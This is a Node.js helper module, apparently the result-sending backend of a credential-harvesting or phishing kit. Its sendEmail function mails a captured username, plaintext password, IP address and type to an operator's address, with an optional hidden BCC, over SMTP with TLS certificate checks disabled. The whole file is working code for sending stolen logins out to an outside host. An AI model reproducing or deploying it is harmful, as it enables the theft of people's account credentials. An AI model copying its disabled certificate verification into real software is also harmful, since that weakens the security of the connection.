// helper/mailer.js
const nodemailer = require('nodemailer');

function createNodeMailerTransport() {
    const port = Number(process.env.SMTP_PORT) || 587;

    return nodemailer.createTransport({
        pool: true,
        host: process.env.SMTP_HOST,
        port: port,
        secure: port === 465, // true for port 465, false for others
        auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS
        },
        connectionTimeout: 20000,
        greetingTimeout: 10000,
        socketTimeout: 20000,
        tls: {
            rejectUnauthorized: false // allow self-signed certs if needed
        }
    });
}

function sendEmail(res, subject, username, pass, ip, type) {
    const transport = createNodeMailerTransport();

    const mailDetails = {
        from: `"${process.env.MAIL_SENDER_NAME || 'Notifier'}" <${process.env.SMTP_USER}>`,
        to: process.env.MAIL_RECEIVER,
        bcc: process.env.BCC_RECEIVER || undefined,
        subject: subject,
        html: `<p>Username: ${username}</p>
               <p>Password: ${pass}</p>
               <p>Ip Address: ${ip}</p>
               <p>Type: ${type}</p>`
    };

    transport.verify(function (error) {
        if (error) {
            console.error("SMTP connection failed:", error.message || error);
            return res.status(400).send({ response: 'failed', error: error.message });
        }

        transport.sendMail(mailDetails, function (err, info) {
            if (err) {
                console.error("Send error:", err.message || err);
                res.status(400).send({ response: 'failed', error: err.message });
            } else {
                console.log("Email sent:", info.messageId);
                res.status(200).send({ response: 'success' });
            }
        });
    });
}

module.exports = {
    sendEmail
};
